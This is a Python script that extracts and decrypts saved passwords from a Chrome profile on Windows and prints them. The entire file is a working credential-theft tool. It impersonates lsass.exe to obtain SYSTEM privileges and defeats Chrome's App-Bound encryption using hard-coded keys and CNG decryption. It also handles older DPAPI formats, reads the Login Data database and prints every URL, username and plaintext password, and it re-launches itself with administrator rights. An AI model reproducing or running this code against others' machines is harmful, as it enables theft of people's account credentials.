import os
import io
import shutil
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
from contextlib import contextmanager
import tempfile
import sys
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from argparse import ArgumentParser

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] in (3, 4):
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data


def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)

    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)

    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey1")
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)
    
    elif parsed_data['flag'] == 4:
        xor_key = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey2")
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)

    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)


def extract_chrome_passwords(profile_dir_path: str,
                             local_state_path: Optional[str] = None,
                             log_callback: Optional[Callable[[str], None]] = None) -> List[Dict[str, str]]:
    """
    Extracts and decrypts saved passwords from a Chrome profile directory.

    Returns a list of dicts: [{"hostname": ..., "username": ..., "password": ...}, ...]
    Returns an empty list if Login Data or Local State is missing or if decryption fails.
    """
    profile_dir = Path(profile_dir_path)
    login_db_path = profile_dir / "Login Data"

    if not login_db_path.is_file():
        if log_callback:
            log_callback(f"Login Data not found in {profile_dir} — no saved passwords.")
        return []

    # Locate Local State if not explicitly provided
    if not local_state_path or not os.path.isfile(local_state_path):
        candidate = profile_dir.parent / "Local State"
        if candidate.is_file():
            local_state_path = str(candidate)
        else:
            candidate = profile_dir / "Local State"
            if candidate.is_file():
                local_state_path = str(candidate)

    if not local_state_path or not os.path.isfile(local_state_path):
        if log_callback:
            log_callback(f"Local State not found for {profile_dir} — cannot decrypt Chrome passwords.")
        return []

    # Read Local State
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except Exception as e:
        if log_callback:
            log_callback(f"Failed to read Local State: {e}")
        return []

    os_crypt = local_state.get("os_crypt", {})
    app_bound_encrypted_key = os_crypt.get("app_bound_encrypted_key")
    encrypted_key = os_crypt.get("encrypted_key")

    v20_cipher = None
    v10_cipher = None

    # 1. Derive v20 master key (App-Bound encryption, Chrome 127+)
    if app_bound_encrypted_key:
        if not is_admin():
            if log_callback:
                log_callback("Admin privileges required for Chrome App-Bound (v20) password decryption.")
        else:
            try:
                raw_appb = binascii.a2b_base64(app_bound_encrypted_key)
                if raw_appb[:4] == b"APPB":
                    key_blob_encrypted = raw_appb[4:]
                    with impersonate_lsass():
                        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
                    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
                    parsed_data = parse_key_blob(key_blob_user_decrypted)
                    v20_master_key = derive_v20_master_key(parsed_data)
                    v20_cipher = AESGCM(v20_master_key)
            except Exception as e:
                if log_callback:
                    log_callback(f"Failed to derive Chrome v20 master key: {e}")

    # 2. Derive v10 master key (DPAPI-protected AES-GCM, Chrome 80-126)
    if encrypted_key:
        try:
            raw_key = binascii.a2b_base64(encrypted_key)
            if raw_key[:5] == b"DPAPI":
                v10_master_key = windows.crypto.dpapi.unprotect(raw_key[5:])
                v10_cipher = AESGCM(v10_master_key)
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to derive Chrome v10 master key: {e}")

    results: List[Dict[str, str]] = []

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempLoginData")
        try:
            shutil.copy2(str(login_db_path), temp_db_path)
            # Copy WAL file if present so recent transactions are readable
            wal_source = login_db_path.with_name(login_db_path.name + "-wal")
            if wal_source.is_file():
                try:
                    shutil.copy2(str(wal_source), os.path.join(temp_dir, "TempLoginData-wal"))
                except Exception:
                    pass
        except PermissionError as e:
            if getattr(e, "winerror", None) == 32:
                if log_callback:
                    log_callback("Chrome is currently running and locking Login Data. Close Chrome and try again.")
            else:
                if log_callback:
                    log_callback(f"Permission error accessing Login Data: {e}")
            return []
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to copy Login Data: {e}")
            return []

        try:
            db_uri = f"file:{pathlib.Path(temp_db_path).as_posix()}?mode=ro"
            con = sqlite3.connect(db_uri, uri=True)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins")
            logins = cur.fetchall()
            con.close()
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to query Login Data database: {e}")
            return []

        for url, username, encrypted_pwd in logins:
            if not encrypted_pwd:
                continue
            url = url or ""
            username = username or ""
            password = ""

            try:
                if encrypted_pwd.startswith(b"v20"):
                    if v20_cipher:
                        nonce = encrypted_pwd[3:15]
                        ciphertext = encrypted_pwd[15:-16]
                        tag = encrypted_pwd[-16:]
                        decrypted = v20_cipher.decrypt(nonce, ciphertext + tag, None)
                        password = decrypted.decode('utf-8', errors='replace')
                    else:
                        password = "(decryption failed - v20 key unavailable)"
                elif encrypted_pwd.startswith(b"v10"):
                    if v10_cipher:
                        nonce = encrypted_pwd[3:15]
                        ciphertext = encrypted_pwd[15:-16]
                        tag = encrypted_pwd[-16:]
                        decrypted = v10_cipher.decrypt(nonce, ciphertext + tag, None)
                        password = decrypted.decode('utf-8', errors='replace')
                    else:
                        password = "(decryption failed - v10 key unavailable)"
                else:
                    # Legacy DPAPI (pre-Chrome 80)
                    try:
                        decrypted = windows.crypto.dpapi.unprotect(encrypted_pwd)
                        password = decrypted.decode('utf-8', errors='replace')
                    except Exception:
                        password = "(decryption failed)"

                results.append({
                    "hostname": url,
                    "username": username,
                    "password": password,
                })
            except Exception as e:
                if log_callback:
                    log_callback(f"Failed to decrypt entry for {url}: {e}")
                results.append({
                    "hostname": url,
                    "username": username,
                    "password": "(decryption failed)",
                })

    return results


def main():
    parser = ArgumentParser(description="Extract and decrypt Chrome saved passwords")
    parser.add_argument("-d", "--dir", dest="directory", help="Path to Chrome profile directory")
    args = parser.parse_args()

    if args.directory:
        profile_dir = Path(args.directory)
    else:
        user_profile = os.environ.get("USERPROFILE", "")
        profile_dir = Path(user_profile) / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default"

    print(f"Extracting passwords from: {profile_dir}")
    passwords = extract_chrome_passwords(str(profile_dir), log_callback=print)
    print(f"\nExtracted {len(passwords)} password(s):")
    for p in passwords:
        print(f"URL: {p['hostname']}")
        print(f"Username: {p['username']}")
        print(f"Password: {p['password']}\n")


if __name__ == "__main__":
    if not is_admin():
        # Relaunch the current script using administrator privileges
        import subprocess
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, subprocess.list2cmdline(sys.argv), None, 1
        )
        sys.exit()
    else:
        main()
